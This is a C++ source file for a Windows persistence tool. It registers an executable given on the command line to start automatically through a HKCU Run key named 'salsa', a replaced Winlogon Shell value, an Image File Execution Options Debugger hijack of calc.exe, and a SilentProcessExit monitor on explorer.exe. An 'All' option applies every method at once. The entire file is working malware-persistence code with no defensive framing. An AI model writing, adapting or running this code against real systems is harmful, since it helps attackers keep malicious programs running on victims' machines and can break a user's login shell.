#include <windows.h>
#include <string.h>
#include <iostream>
#include <conio.h>

char* tita;
const char* exe;
const char* exe2;

using namespace std;

// register run
int runkeys(const char* exe) {
    HKEY hkey = NULL;

    LONG res = RegOpenKeyEx(HKEY_CURRENT_USER,(LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        RegSetValueEx(hkey,(LPCSTR)"salsa", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
        RegCloseKey(hkey);
    }
    return 0;
}

//winlogon
int winlogon(const char* exe){
    HKEY hkey = NULL;
    
    LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        RegSetValueEx(hkey,(LPCSTR)"Shell", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
        RegCloseKey(hkey);
    }

    return 0;
}

//execute exe when open app
int open(string exee){
    string tititi = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe\" /v Debugger /t reg_sz /d \"cmd /C _calc.exe & " + exee + " /f";
    const char* command = tititi.c_str();
    
    system("copy C:\\Windows\\system32\\calc.exe C:\\Windows\\system32\\_calc.exe");
    system(command);
    return 0;
}

int close(const char* exe) {
  HKEY hkey = NULL;
  DWORD gF = 512;
  DWORD rM = 1;

  // image file
  const char* img = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe";

  // silent exit
  const char* silent = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\explorer.exe";



  LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)img, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
  if (res == ERROR_SUCCESS) {
    RegSetValueEx(hkey, (LPCSTR)"GlobalFlag", 0, REG_DWORD, (const BYTE*)&gF, sizeof(gF));
    RegCloseKey(hkey);
  }

  res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)silent, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
  if (res == ERROR_SUCCESS) {
    RegSetValueEx(hkey, (LPCSTR)"ReportingMode", 0, REG_DWORD, (const BYTE*)&rM, sizeof(rM));
    RegSetValueEx(hkey, (LPCSTR)"MonitorProcess", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }

  return 0;
}

int main (int argc, char** argv){
    exe = argv[1];
    for (int i = 1; i < argc; ++i) {
        if (argv[i] == string("All")) {
            runkeys(exe);
            open(exe);
            close(exe);
            winlogon(exe);
        }
        else if (argv[i] == string("Winlogon") || argv[i] == string("winlogon")) {
            winlogon(exe);
        }
        else if (argv[i] == string("Open") || argv[i] == string("open")) {
            open(exe);
        }
        else if (argv[i] == string("Close") || argv[i] == string("close")) {
            close(exe);
        }
        else if (argv[i] == string("Run") || argv[i] == string("run")) {
            runkeys(exe);
        }
    }
    return 0;
}
